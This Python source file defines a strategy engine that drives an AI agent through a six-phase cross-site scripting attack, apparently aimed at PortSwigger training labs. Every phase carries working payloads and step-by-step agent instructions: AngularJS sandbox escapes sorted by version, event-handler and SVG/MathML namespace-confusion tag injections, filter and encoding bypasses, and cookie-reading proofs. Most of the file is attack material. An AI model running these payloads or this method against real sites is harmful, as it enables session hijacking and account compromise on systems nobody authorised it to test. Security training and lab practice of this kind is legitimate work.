"""
=============================================================================
Reynard — Strategy Engine
=============================================================================
Phase-based attack methodology with progress tracking.

Defines a 6-phase exploitation pipeline:
  Phase 1: RECON       — Identify injection points, technology stack
  Phase 2: INJECTION   — Confirm reflection/injection with probes
  Phase 3: CONTEXT     — Determine context (HTML, JS, Angular, etc.)
  Phase 4: CAPABILITY  — Test what operations are possible
  Phase 5: ESCAPE      — Sandbox escape / filter bypass
  Phase 6: EXPLOIT     — Execute the final payload

Each phase has entry/exit conditions, suggested payloads, and max attempts.
The strategy engine tells the agent exactly what to do next.
=============================================================================
"""

import json
from dataclasses import dataclass, field
from typing import Any


# =============================================================================
# Phase Definitions
# =============================================================================

@dataclass
class Phase:
    """Definition of a single exploitation phase."""
    name: str
    description: str
    entry_conditions: list[str]     # What must be true to enter
    exit_conditions: list[str]      # What must be true to move on
    payloads: list[dict]            # Ordered payloads with metadata
    max_attempts: int               # Give up after this many failures
    instructions: str               # Detailed instructions for the agent


# =============================================================================
# Phase Library
# =============================================================================

PHASES: dict[str, Phase] = {
    "recon": Phase(
        name="RECON",
        description="Identify the target technology stack, injection points, and basic behavior.",
        entry_conditions=["Target URL is known"],
        exit_conditions=[
            "Technology stack identified (Angular? React? Plain HTML?)",
            "At least one potential injection point found",
            "Basic response behavior understood",
        ],
        payloads=[
            {"payload": "teststring123", "purpose": "Find where input is reflected"},
            {"payload": "<u>test</u>", "purpose": "Test if HTML tags are rendered"},
            {"payload": "{{7*7}}", "purpose": "Test Angular template injection"},
            {"payload": "${7*7}", "purpose": "Test template literal injection"},
            {"payload": "<%=7*7%>", "purpose": "Test server-side template injection"},
            {"payload": "';alert(1)//", "purpose": "Test basic JS injection"},
        ],
        max_attempts=12,
        instructions="""
RECON PHASE — Your goal is reconnaissance. Do NOT try to exploit yet.

1. First, make a plain GET request to the target URL to see the page structure
2. Look at the HTML source for:
   - Input fields, search boxes, URL parameters that reflect input
   - AngularJS (ng-app, angular.js), React, Vue indicators
   - CSP headers, security headers
   - Script tags, inline event handlers
3. Send basic probe payloads to identify:
   - WHERE your input appears in the response
   - WHETHER special characters are encoded or raw
   - What technology stack is in use

CRITICAL: Send ONE payload at a time. Analyze the response FULLY before sending the next.
Record every finding as a FACT.
""",
    ),

    "injection": Phase(
        name="INJECTION",
        description="Confirm that our input is reflected and determine encoding behavior.",
        entry_conditions=[
            "Injection point identified from RECON",
        ],
        exit_conditions=[
            "Reflection confirmed at specific location(s)",
            "Encoding behavior documented (<, >, \", ' — which are encoded?)",
        ],
        payloads=[
            {"payload": "<test123>", "purpose": "Test angle bracket encoding"},
            {"payload": "\"test123\"", "purpose": "Test double quote encoding"},
            {"payload": "'test123'", "purpose": "Test single quote encoding"},
            {"payload": "<img src=x>", "purpose": "Test tag injection"},
            {"payload": "javascript:alert(1)", "purpose": "Test protocol handler"},
            {"payload": "'-alert(1)-'", "purpose": "Test JS expression injection"},
            {"payload": "{{constructor}}", "purpose": "Test Angular object access"},
        ],
        max_attempts=10,
        instructions="""
INJECTION PHASE — Confirm reflection and map encoding behavior.

You KNOW where the injection point is from RECON. Now determine:

1. Send payloads with specific characters: < > " ' {{ }} / \\
2. For EACH character, record whether it is:
   - Reflected RAW (no encoding)
   - HTML entity encoded (&lt; &gt; &quot; etc.)
   - URL encoded (%3C %3E etc.)
   - Stripped/removed entirely
   - Causes an error/block

3. Record EACH finding as a fact:
   - "angle_brackets_encoded: true"
   - "single_quotes_raw: true"
   - "double_quotes_encoded: true"

This mapping is CRITICAL for Phase 3+. Do not skip it.
""",
    ),

    "context": Phase(
        name="CONTEXT",
        description="Determine the exact rendering context of our injection.",
        entry_conditions=[
            "Reflection confirmed",
            "Encoding behavior known",
        ],
        exit_conditions=[
            "Context precisely identified (html_body, html_attribute, js_string, angular_template, etc.)",
            "For Angular: version identified, sandbox status known",
        ],
        payloads=[
            {"payload": "{{7*7}}", "purpose": "Test Angular expression evaluation"},
            {"payload": "{{constructor.constructor('return 1')()}}", "purpose": "Test Angular sandbox"},
            {"payload": "{{$eval('1+1')}}", "purpose": "Test $eval access"},
            {"payload": "<div>test</div>", "purpose": "Test HTML context rendering"},
            {"payload": "'-'", "purpose": "Test JS string context"},
            {"payload": ";var x=1;", "purpose": "Test JS code context"},
        ],
        max_attempts=10,
        instructions="""
CONTEXT PHASE — Identify the exact rendering context.

Based on KNOWN FACTS from previous phases:

1. If Angular detected:
   - Did {{7*7}} evaluate to 49? → Angular template context CONFIRMED
   - What Angular version? (Check page source for angular.js version number)
   - Does the sandbox apply? (Angular < 1.6 has sandbox)

2. If HTML context:
   - Are we inside a tag attribute? (e.g., value="OUR_INPUT")
   - Are we inside a script tag?
   - Are we in plain HTML body?

3. If JS context:
   - Are we inside a string? Single or double quoted?
   - Can we break out of the string?

Record the EXACT context as a fact: "context: angular_template_v1.5.8_sandbox"
""",
    ),

    "capability": Phase(
        name="CAPABILITY",
        description="Test what operations and objects are accessible in our context.",
        entry_conditions=[
            "Context identified",
        ],
        exit_conditions=[
            "Available capabilities documented",
            "Path to code execution identified (or proven impossible)",
        ],
        payloads=[
            # Angular sandbox exploration
            {"payload": "{{constructor}}", "purpose": "Test constructor access"},
            {"payload": "{{'a'.constructor}}", "purpose": "Test string constructor"},
            {"payload": "{{'a'.constructor.prototype}}", "purpose": "Test prototype chain"},
            {"payload": "{{toString()}}", "purpose": "Test function calls"},
            {"payload": "{{[].join}}", "purpose": "Test array methods"},
            {"payload": "{{{}[\"constructor\"]}}", "purpose": "Test bracket notation"},
            {"payload": "{{$on}}", "purpose": "Test scope methods"},
            # JS context exploration
            {"payload": "window", "purpose": "Test window access"},
            {"payload": "document.domain", "purpose": "Test document access"},
            {"payload": "self", "purpose": "Test self reference"},
            {"payload": "this", "purpose": "Test this context"},
        ],
        max_attempts=15,
        instructions="""
CAPABILITY PHASE — Map what you can do in this context.

Based on the KNOWN CONTEXT:

IF ANGULAR SANDBOX:
1. Test object access: constructor, prototype, __proto__
2. Test scope variables: $eval, $on, $watch, $apply
3. Test function invocation: can you call functions?
4. Test bracket notation: {}["constructor"]
5. Test string methods: 'a'.constructor, charAt, etc.

IF JS STRING:
1. Can you break out? Try closing the quote
2. Can you inject new statements?
3. Can you call functions directly?

IF HTML BODY:
1. Can you inject script tags?
2. Can you inject event handlers (onerror, onload)?
3. Can you inject SVG/math tags?
4. Which tag names are allowed? Which are blocked?

Record capabilities: "constructor_accessible: true", "eval_blocked: true"
""",
    ),

    "escape": Phase(
        name="ESCAPE",
        description="Bypass sandbox, filters, or encoding to achieve code execution.",
        entry_conditions=[
            "Capabilities mapped",
            "Constraints identified",
        ],
        exit_conditions=[
            "Working escape/bypass technique found",
            "Can execute arbitrary JavaScript",
        ],
        payloads=[
            # Angular 1.x sandbox escapes (version-specific)
            {
                "payload": "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)')}}",
                "purpose": "Angular 1.5.x sandbox escape via charAt override",
            },
            {
                "payload": "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}",
                "purpose": "Angular 1.5.x sandbox escape (compact)",
            },
            {
                "payload": "{{$eval.constructor('alert(1)')()}}",
                "purpose": "Angular sandbox escape via $eval.constructor",
            },
            {
                "payload": "{{toString().constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}",
                "purpose": "Angular 1.4.x sandbox escape",
            },
            {
                "payload": "{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)')}}",
                "purpose": "Angular 1.3.x sandbox escape",
            },
            {
                "payload": "{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}",
                "purpose": "Generic Angular sandbox escape",
            },
            # HTML context escapes
            {
                "payload": "<svg onload=alert(1)>",
                "purpose": "SVG tag with event handler",
            },
            {
                "payload": "<img src=x onerror=alert(1)>",
                "purpose": "IMG tag with error handler",
            },
            {
                "payload": "<body onload=alert(1)>",
                "purpose": "Body tag with onload",
            },
            {
                "payload": "<iframe src=\"javascript:alert(1)\">",
                "purpose": "Iframe with javascript: protocol",
            },
            {
                "payload": "<math><mtext></mtext><mglyph><svg><mtext><textarea><path id=\"</textarea><img src=x onerror=alert(1)>\">",
                "purpose": "Math/SVG namespace confusion",
            },
            # Encoding bypasses
            {
                "payload": "\\u0061lert(1)",
                "purpose": "Unicode escape for 'a' in alert",
            },
            {
                "payload": "String.fromCharCode(97,108,101,114,116)(1)",
                "purpose": "fromCharCode construction",
            },
        ],
        max_attempts=20,
        instructions="""
ESCAPE PHASE — Bypass the sandbox/filters to get code execution.

CRITICAL RULES:
1. Use KNOWN FACTS about encoding and constraints
2. Do NOT re-test payloads that have already failed
3. Adapt payloads based on the SPECIFIC Angular version
4. If a payload partially works (e.g., no error but no execution), modify it

ANGULAR SANDBOX ESCAPE STRATEGY (by version):
- 1.0.x-1.1.x: No sandbox, direct expression execution
- 1.2.x: {{constructor.constructor('alert(1)')()}}
- 1.3.x: charAt override via __proto__ injection
- 1.4.x: toString().constructor.prototype override  
- 1.5.x: charAt=[].join + $eval combination
- 1.6.0+: Sandbox removed, expressions execute directly

HTML ENCODING BYPASS:
- If < > are blocked but quotes are not: try event handlers on existing tags
- If quotes are blocked: try backticks, no-quote attributes
- If specific tags are blocked: try alternative tags (svg, math, details, etc.)
- If specific events are blocked: try alternative events (onbegin, onanimationend, etc.)

ALWAYS: Check the PortSwigger XSS cheat sheet for the latest bypasses.
Generate payloads that account for ALL known constraints simultaneously.
""",
    ),

    "exploit": Phase(
        name="EXPLOIT",
        description="Execute the final exploit payload to solve the lab.",
        entry_conditions=[
            "Working escape/bypass technique confirmed",
        ],
        exit_conditions=[
            "Lab solved (congratulations message detected)",
        ],
        payloads=[
            {"payload": "alert(1)", "purpose": "Standard XSS proof"},
            {"payload": "alert(document.domain)", "purpose": "Domain-based XSS proof"},
            {"payload": "alert(document.cookie)", "purpose": "Cookie-based XSS proof"},
            {"payload": "print()", "purpose": "Alternative XSS proof (print)"},
        ],
        max_attempts=10,
        instructions="""
EXPLOIT PHASE — Execute the final payload.

1. Combine your working escape technique with the required trigger (usually alert())
2. URL-encode the payload properly for the delivery mechanism
3. Send the final exploit.
   - IMPORTANT: To submit forms or deliver exploits (e.g. PortSwigger exploit servers), use `http_request` (POST request with curl) rather than `browser_interact`. Headless browsers like Lightpanda often fail on form navigation scripts. Look at the form action and parameters, and submit it manually.
4. Check if the lab shows "Congratulations" or "solved"
5. If it doesn't work, check:
   - Is the encoding correct for URL parameters?
   - Does the payload need to be in a specific parameter?
   - Is there a delivery mechanism (e.g., deliver to victim)?
""",
    ),
}


# =============================================================================
# StrategyEngine
# =============================================================================

class StrategyEngine:
    """
    Drives the exploitation methodology by managing phases,
    suggesting payloads, and tracking progress.
    """

    def __init__(self):
        self.phases = PHASES
        self.attempt_counts: dict[str, int] = {
            name: 0 for name in PHASES
        }

    def get_phase(self, phase_name: str) -> Phase:
        """Get a phase by name."""
        return self.phases.get(phase_name)

    def get_phase_prompt(self, phase_name: str, facts: dict) -> str:
        """
        Generate the full instruction prompt for a given phase,
        customized with known facts.
        """
        phase = self.phases.get(phase_name)
        if not phase:
            return f"Unknown phase: {phase_name}"

        lines = [
            f"{'='*60}",
            f"CURRENT PHASE: {phase.name}",
            f"{'='*60}",
            f"Goal: {phase.description}",
            f"",
            f"Exit conditions (ALL must be met to advance):",
        ]
        for cond in phase.exit_conditions:
            lines.append(f"  - {cond}")

        lines.append(f"\nAttempts: {self.attempt_counts[phase_name]}/{phase.max_attempts}")
        lines.append(f"\n{phase.instructions}")

        # Add suggested payloads (that haven't been tried)
        lines.append(f"\nSuggested payloads for this phase:")
        for i, p in enumerate(phase.payloads, 1):
            lines.append(f"  {i}. {p['payload']}")
            lines.append(f"     Purpose: {p['purpose']}")

        return "\n".join(lines)

    def record_attempt(self, phase_name: str) -> None:
        """Record an attempt in a phase."""
        if phase_name in self.attempt_counts:
            self.attempt_counts[phase_name] += 1

    def should_advance(self, phase_name: str, facts: dict) -> bool:
        """
        Check if exit conditions for a phase are met based on known facts.
        Returns True if the agent should move to the next phase.
        """
        if phase_name == "recon":
            return (
                facts.get("injection_point") is not None
                and facts.get("technology_stack") is not None
            )
        elif phase_name == "injection":
            return facts.get("reflection_confirmed") is True
        elif phase_name == "context":
            return facts.get("context") is not None
        elif phase_name == "capability":
            return facts.get("capabilities_mapped") is True
        elif phase_name == "escape":
            return facts.get("escape_technique") is not None
        elif phase_name == "exploit":
            return facts.get("lab_solved") is True
        return False

    def should_abandon(self, phase_name: str) -> bool:
        """Check if max attempts exceeded for a phase."""
        if phase_name in self.attempt_counts:
            max_att = self.phases[phase_name].max_attempts
            return self.attempt_counts[phase_name] >= max_att
        return False

    def get_suggested_payloads(self, phase_name: str,
                                used_payloads: set[str]) -> list[dict]:
        """Get payloads for a phase that haven't been tried yet."""
        phase = self.phases.get(phase_name)
        if not phase:
            return []
        return [
            p for p in phase.payloads
            if p["payload"].strip().lower() not in used_payloads
        ]
